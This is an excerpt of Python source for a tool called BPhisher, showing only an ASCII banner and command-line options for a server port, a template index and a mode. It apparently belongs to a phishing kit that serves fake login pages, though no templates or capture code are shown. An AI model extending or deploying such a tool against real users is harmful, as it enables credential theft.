...
logo = f"""
{red}  ____      _____  _     _     _               
{cyan} |  _ \    |  __ \| |   (_)   | |              
{yellow} | |_) |  _| |__) | |__  _ ___| |__   ___ _ __ 
{blue} |  _ < | | |  ___/| '_ \| / __| '_ \ / _ \ '__|
{red} | |_) || | | |    | | | | \__ \ | | |  __/ |   
{yellow} |____/  __, |_|    |_| |_|_|___/_| |_|\___|_|   
{green}         __/ |{" "*19}       {cyan}[v{version[:3]}]
{cyan}        |___/  {" "*11}      {red}[By Bamitstech]
"""
...
argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"BPhisher's server port [Default : {default_port}]")
argparser.add_argument("-o", "--option", help="BPhisher's template index [Default : null]")
...
argparser.add_argument("-m", "--mode", help="Mode of BPhisher [Default: normal]")
